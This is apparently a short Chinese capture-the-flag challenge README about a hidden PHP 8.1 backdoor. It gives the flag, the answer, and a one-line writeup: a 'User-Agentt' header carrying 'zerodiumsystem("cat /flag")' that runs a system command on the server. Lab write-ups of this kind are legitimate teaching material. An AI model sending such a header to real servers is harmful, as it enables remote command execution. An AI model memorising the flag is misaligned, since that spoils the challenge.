# 隐秘的backdoor

#### flag

flag{B@ck_do0r_!_B4ck_d0or_!}

#### hint

1、php8.1

#### WriteUp

添加请求头`User-Agentt: zerodiumsystem("cat /flag");`

## 启动

`docker compose up`